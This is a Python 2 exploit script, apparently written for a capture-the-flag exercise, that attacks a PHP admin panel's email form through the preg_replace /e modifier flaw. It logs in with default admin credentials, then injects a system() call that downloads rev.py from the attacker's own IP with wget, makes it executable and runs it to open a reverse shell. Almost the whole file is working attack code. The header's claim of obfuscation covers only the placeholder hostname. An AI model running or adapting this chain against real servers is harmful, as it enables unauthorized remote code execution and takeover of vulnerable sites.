#!/usr/bin/python

'''

Author: r4mzih4x (@raulbringasjr)
Date: 4/27/2019

Automated reverse shell for an admin panel that has a PHP preg_replace vulnerability:
    * This was used in a CTF environment where it is completely legal to experiment and access the systems.
    * Please do not use this against any systems in an unauthorized manner...

    *** This script has been obfuscated to prevent it's use against an active CTF challenge *** 

    ### REQUIRED: ###
    -netifaces - 'pip install netifaces'
    -Python SimpleHTTPServer to serve reverse shell payload script
    -Python Reverse shell script rev.py
    * Reverse Shell (rev.py) is written by Infodox (https://github.com/infodox/python-pty-shells)

'''

import requests
import webbrowser
import netifaces

# Set the interface we want to use to query the current IP address
netifaces.ifaddresses('tun0')
myIP = netifaces.ifaddresses('tun0')[netifaces.AF_INET][0]['addr']
print 'My IP Address: ', myIP

'''

First URL used to obtain the Cookie with the PHP session id
    www.example.com/admin/login.php

Email form with PHP preg_replace vulnerability 
    www.example.com/admin/email.php

By default the email.php page uses /i to replace "this_word" with "that_word" using the preg_replace PHP function.
Since it is possible to use /e (evaluate) to replace /i, we are able to obtain Remote Code Execution (RCE).
RCE occurs when we swap /i with /e in the POST request and PHP executes the system command passed to it to gain a reverse shell.

Post Data to gain RCE: = keyword[/this_word/e]=revShellPayload&to=r4mzi%40aol.com&subject=plp&message=this_word

References: 
    http://www.madirish.net/402
    https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace

'''

adminURL = "http://www.example.com/admin/login.php"
emailURL = "http://www.example.com/admin/email.php"

# Use the discovered credentials to login to the admin panel
payload = {'username':  'admin','password': 'password'}

# Set the email payload to exploit PHP preg_replace function to gain RCE
# Download the reverse shell to a writeable directory, make the script executeable, and execute it to gain a shell...
revShellPayload = 'system("wget http://' + myIP + '/rev.py -O uploads/rev.py;chmod 755 uploads/rev.py;python2 uploads/rev.py")'

# Set the payload using the vulnerable email form in the admin panel
# Original RCE Proof:
# emailPayload = {'keyword[/this_word/e]': 'system("id")','to': 'r4mzi%40aol.com','subject': 'plp', 'message': 'this_word'}
emailPayload = {'keyword[/this_word/e]': revShellPayload,'to': 'r4mzi%40aol.com','subject': 'plp', 'message': 'this_word'}

# Create requests using the same session to retain the cookie and session id info...
with requests.session() as session:
    # Use the session information attempt a login with credentials
    session.get(adminURL)
    
    print 'Attempting to login to the Admin Dashboard...'
    loginURL = 'http://www.example.com/admin/dologin.php'
    
    print 'DELISHUS COOKIES...OMNOMNOMNOM!!'
    print 'Session ID Cookie: ', session.cookies

    # Post the username and password along with Session ID cookie to login
    print 'Running first POST request to: ', adminURL
    request = session.post(loginURL, data=payload)
    print 'Status Code: ', (request.status_code)

    # Post the malicious data via PHP PCRE to the email.php form to pop a shell 
    session.get(emailURL)
    print 'Running Second POST request with preg_replace Exploit to: ', emailURL
    print 'Session ID Information: ', session.cookies
    print 'Attempting to pop a shell on port 6661...'
    request2 = session.post(emailURL, data=emailPayload)
    print 'Status Code: ', (request2.status_code)
